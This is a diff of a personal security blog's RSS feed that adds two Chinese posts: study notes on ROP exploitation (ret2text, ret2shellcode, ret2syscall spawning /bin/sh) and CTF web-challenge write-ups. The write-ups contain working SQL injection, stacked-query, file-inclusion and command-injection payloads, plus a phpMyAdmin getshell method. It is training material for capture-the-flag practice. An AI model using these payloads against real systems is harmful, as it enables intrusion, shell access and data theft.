@@ -1,10 +1,926 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/posts/</link><description>Recent content in Posts on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 02 Jan 2022 20:08:38 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>2021小结</title><link>https://amiaaaz.github.io/2022/01/02/2021-short-summary/</link><pubDate>Sun, 02 Jan 2022 20:08:38 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/02/2021-short-summary/</guid><description>&lt;p>写点什么呢？现在是2022年1月2日23点08分，本来应该在疯狂的肝数据结构的期末复习，但是我还是决定把本来计划在回家的飞机上写的年末总结写掉，了一桩心事。&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/posts/</link><description>Recent content in Posts on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 18 Jan 2022 00:00:14 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>pwn rop入门-学习笔记</title><link>https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/</link><pubDate>Tue, 18 Jan 2022 00:00:14 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/</guid><description>&lt;h1 id="rop">ROP&lt;/h1>
+&lt;p>return oriented programming&lt;/p>
+&lt;h2 id="简单的汇编指令">简单的汇编指令&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>ret -&amp;gt; pop EIP (ESP增大)&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>leave -&amp;gt; move ESP, EBP; pop EBP&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>intel&lt;/th>
+&lt;th>AT&amp;amp;T&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>mov eax, 8&lt;/td>
+&lt;td>movl $8, %eax&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>mov ebx, 0ffffh&lt;/td>
+&lt;td>movl $0xffff, %ebx&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>int 80h&lt;/td>
+&lt;td>int $80&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>mov eax, [ecx]&lt;/td>
+&lt;td>movl (%ecx), %eax&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="几种防护措施">几种防护措施&lt;/h2>
+&lt;ul>
+&lt;li>canary: 随机值防止栈溢出 (cookie)&lt;/li>
+&lt;li>ASLR: 全局系统变量&lt;code>/proc/sys/kernel/randomize_va_space&lt;/code>，内存地址随机化，而gdb调试中为关闭状态&lt;/li>
+&lt;li>PIE: 内存地址随机化&lt;/li>
+&lt;li>NX: 数据不可执行&lt;/li>
+&lt;/ul>
+&lt;h2 id="ret2text">ret2text&lt;/h2>
+&lt;p>在代码段.text存在后门函数，将ret address修改为后门函数的地址控制函数的执行&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75715e"># n: ebp-eax+4(or 8), p32 or p64&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2shellcode">ret2shellcode&lt;/h2>
+&lt;p>存在rwx代码片段，传入shellcode并修改ret address为shellcode所在的缓冲区地址&lt;/p>
+&lt;p>NX不开启时直接写入栈缓冲区，开启时向bss缓冲区或堆缓冲区写入shellcode并使用mprotect赋予可执行权限&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;a href="http://shell-storm.org/shellcode/">shellcode&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">pwn&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">amd64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># before: context.arch = &amp;#39;amd64&amp;#39;!&lt;/span>
+&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">())&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
+&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ljust&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sh_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2syscall">ret2syscall&lt;/h2>
+&lt;p>存在&lt;code>/bin/sh&lt;/code>或&lt;code>sh&lt;/code>字符串，构造gadgets多次跳转ret addr来执行&lt;code>execve&lt;/code>系统调用；gadgets通过&lt;code>ROPgadget&lt;/code>寻找&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">ROPgadget --binary filename_here --only &lt;span style="color:#d88200">&amp;#39;pop|ret&amp;#39;&lt;/span> &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#39;ebx&amp;#39;&lt;/span>
+ROPgadget --binary filename_here --string &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
+ROPgadget --binary rop --only &lt;span style="color:#d88200">&amp;#39;int&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>整体的payload构造与函数调用栈的工作原理和系统调用的实现有关，x86下通过&lt;code>int 0x80&lt;/code>执行，amd64下为&lt;code>syscall&lt;/code>；注意参数传入的顺序 (1-&amp;gt;N) 与栈中存放的顺序 (N-&amp;gt;1)的区别&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">pop_eax_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0xb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pop_edx_ecx_ebx_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">bin_sh_addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">int80_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#75715e"># 0xb: execve的系统调用号 11, execve(&amp;#34;/bin/sh&amp;#34;, NULL, NULL)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>_Refer: &lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
+&lt;/h4>
+&lt;/summary>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;a href="https://www.bilibili.com/video/BV1854y1y7Ro">XMCVE 2020 CTF Pwn入门课程&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">ctfwiki - Stack Overflow&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://www.yuque.com/hxfqg9/bin/zzg02e">蒸米ROP&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://github.com/Vancir/365-days-get-xuanwulab-job/blob/master/weeks/week1.md">365-days-get-xuanwulab-job/weeks/week1.md&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C 语言函数调用栈 (一)&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="http://www.cnblogs.com/clover-toeic/p/3756668.html">C 语言函数调用栈 (二)&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://www.cnblogs.com/clover-toeic/p/3757091.html">C 语言函数调用栈 (二)&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/details></description></item><item><title>buuoj刷题记录-web</title><link>https://amiaaaz.github.io/2022/01/17/buuoj-web-wp/</link><pubDate>Mon, 17 Jan 2022 23:41:35 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/17/buuoj-web-wp/</guid><description>&lt;p>之前已经做了不少了，这里是个合集；这几天内要尽快刷完捏~&lt;/p>
+&lt;p>寒假要把go和java学了，之前学不明白的xss也该学学了！（早该了（&lt;/p>
+&lt;hr>
+&lt;h2 id="page-01">page 01&lt;/h2>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]EasySQL
+&lt;/h4>
+&lt;/summary>
+&lt;p>弱口令登入&lt;/p>
+&lt;p>&lt;code>admin'or 1#: 12345&lt;/code>&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[HCTF 2018]WarmUp
+&lt;/h4>
+&lt;/summary>
+&lt;p>查看页面源码提示source.php&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">emmm&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">checkFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$whitelist&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;source.php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;hint&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#d88200">&amp;#34;hint.php&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span> &lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">is_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;you can&amp;#39;t see it&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$whitelist&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#75af00">mb_strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$whitelist&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;span style="color:#111">$_page&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#75af00">mb_strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_page&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;?&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">in_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$whitelist&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;you can&amp;#39;t see it&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span> &lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">is_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">emmm&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">checkFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
+&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200"> /&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>mb_substr&lt;/code>与&lt;code>substr&lt;/code>用法一样&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220117091202170.png" alt="image-20220117091202170">&lt;/p>
+&lt;p>所以我们在参数内多加一个&lt;code>?&lt;/code>即可，但是要注意urlencode，代码中有一次decode，本身还有一次decode，所以要encode两次&lt;/p>
+&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>/source.php?file=hint.php%253F../../../../../ffffllllaaaagggg
+&lt;/code>&lt;/pre>&lt;p>参考：&lt;a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">phpmyadmin4.8.1后台getshell&lt;/a>&lt;/p>
+&lt;p>同样的方式绕过waf登入数据库，创建名为一句话shell的表，包含对应路径的数据库文件得到shell&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]Havefun
+&lt;/h4>
+&lt;/summary>
+&lt;p>页面源码&lt;/p>
+&lt;pre tabindex="0">&lt;code>$cat=$_GET['cat'];
+echo $cat;
+if($cat=='dog'){
+echo 'Syc{cat_cat_cat_cat}';
+}
+&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>/?cat=dog
+&lt;/code>&lt;/pre>&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[ACTF2020 新生赛]Include
+&lt;/h4>
+&lt;/summary>
+&lt;p>首页提示/?file=flag.php，文件包含点；尝试/etc/passwd，成功，/flag失败，尝试php伪协议&lt;/p>
+&lt;pre tabindex="0">&lt;code>/?file=php://filter/convert.base64-encode/resource=flag.php
+&lt;/code>&lt;/pre>&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[强网杯 2019]随便注
+&lt;/h4>
+&lt;/summary>
+&lt;pre tabindex="0">&lt;code>1'
+1' or '1
+1' union select database()#
+&lt;/code>&lt;/pre>&lt;p>得到过滤条件&lt;/p>
+&lt;pre tabindex="0">&lt;code>return preg_match(&amp;quot;/select|update|delete|drop|insert|where|\./i&amp;quot;,$inject);
+&lt;/code>&lt;/pre>&lt;p>使用堆叠注入&lt;/p>
+&lt;pre tabindex="0">&lt;code>1';show tables; # 两个表 1919810931114514, words
+1';show columns from `1919810931114514`; # 含flag列 但只回显2列
+1';show columns from `words`; # 回显3列id+data 都是空的
+&lt;/code>&lt;/pre>&lt;p>把&lt;code>1919810931114514&lt;/code>表改名为&lt;code>words&lt;/code>，flag改为id，即可回显对应的data&lt;/p>
+&lt;pre tabindex="0">&lt;code>1';alter table words rename to amiz;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
+1' or '1 # 得到flag
+&lt;/code>&lt;/pre>&lt;p>————或者使用&lt;code>set&lt;/code>&amp;amp;&lt;code>prepare from&lt;/code>&amp;amp;&lt;code>execute&lt;/code>的方式来堆叠&lt;/p>
+&lt;pre tabindex="0">&lt;code>1';set @xx=concat('se','lect * from `1919810931114514`;');prepare x from @xx;execute x;#
+&lt;/code>&lt;/pre>&lt;p>回显过滤条件&lt;/p>
+&lt;pre tabindex="0">&lt;code>strstr($inject, &amp;quot;set&amp;quot;) &amp;amp;&amp;amp; strstr($inject, &amp;quot;prepare&amp;quot;)
+&lt;/code>&lt;/pre>&lt;p>用大写绕过&lt;/p>
+&lt;pre tabindex="0">&lt;code>1';Set @xx=concat('se','lect * from `1919810931114514`;');Prepare x from @xx;execute x;#
+&lt;/code>&lt;/pre>&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[SUCTF 2019]EasySQL
+&lt;/h4>
+&lt;/summary>
+&lt;pre tabindex="0">&lt;code>1;show tables; # Flag
+1;show columns from Flag; # 被过滤
+&lt;/code>&lt;/pre>&lt;p>由于没有完整的报错首先猜一下后端语句，输入非0数字回显为1，其余为空，推测后端有&lt;code>||&lt;/code>输出0的情况&lt;/p>
+&lt;pre tabindex="0">&lt;code>select $_POST['query'] || flag from Flag;
+&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>*,1
+# 相当于 select *,1 from Flag;
+&lt;/code>&lt;/pre>&lt;p>————或者使用堆叠，payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>1;set sql_mode=PIPES_AS_CONCAT;select 1
+&lt;/code>&lt;/pre>&lt;p>将&lt;code>||&lt;/code>转变为&lt;code>+&lt;/code>一样的连接字符&lt;/p>
+&lt;p>flag{4032c605-fa39-448d-aa2d-f35fca8d3fa9}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[ACTF2020 新生赛]Exec
+&lt;/h4>
+&lt;/summary>
+&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>127.0.0.1;cat /flag
+&lt;/code>&lt;/pre>&lt;p>flag{f8c12653-ce6e-4eef-8f69-9433506d5adc}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]Secret File
+&lt;/h4>
+&lt;/summary>
+&lt;p>页面源码提示/Archive_room.php，/end.php，/secr3t.php看到文件包含点，用伪协议&lt;/p>
+&lt;p>payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
+&lt;/code>&lt;/pre>&lt;p>flag{7719d9f9-6f2f-46f7-bc78-a82cfc52d470}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]LoveSQL
+&lt;/h4>
+&lt;/summary>
+&lt;p>万能密码登入，得到密码是bd798bc32e819b4f57d4e1523d5834c6&lt;/p>
+&lt;pre tabindex="0">&lt;code>admin' union select 1,2,3# # 有3列
+1' union select 1,database(),3# # 回显位在2和3上 库名geek
+1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();# # 表名geekuser, l0ve1ysq1
+1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1';# # id, username, password
+1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1#
+&lt;/code>&lt;/pre>&lt;p>注意&lt;code>group_concat()&lt;/code>是个函数，憋手欠加空格&lt;/p>
+&lt;p>flag{e210152f-fc19-4139-9d2a-dcbb6c4c6268}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[GXYCTF2019]Ping Ping Ping
+&lt;/h4>
+&lt;/summary>
+&lt;pre tabindex="0">&lt;code>127.0.0.1;ls # index.php, flag.php
+127.0.0.1;cat flag.php # fxck your space!
+127.0.0.1;cat$IFSindex.php # 空内容
+127.0.0.1;cat$IFSflag.php # fxck your flag!
+127.0.0.1;cat$IFS$7`ls` # 页面源码得到flag
+127.0.0.1;a=g;cat$IFS$7fla$a.php # 页面源码得到flag
+&lt;/code>&lt;/pre>&lt;p>flag{281616ef-7318-42b6-adaf-825edf76ff26}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]Knife
+&lt;/h4>
+&lt;/summary>
+&lt;p>白给shell，连蚁剑&lt;/p>
+&lt;p>flag{95a76aa0-58b5-4494-bb49-7f11ce00774d}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]Http
+&lt;/h4>
+&lt;/summary>
+&lt;p>页面源码提示/Secret.php，跟着提示一直修改请求头&lt;/p>
+&lt;pre tabindex="0">&lt;code>Referer: https://Sycsecret.buuoj.cn
+User-Agent: Syclover
+X-Forwarded-For: 127.0.0.1
+&lt;/code>&lt;/pre>&lt;p>flag{614f3098-1c0f-480b-97f7-9caa49025e83}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[极客大挑战 2019]Upload
+&lt;/h4>
+&lt;/summary>
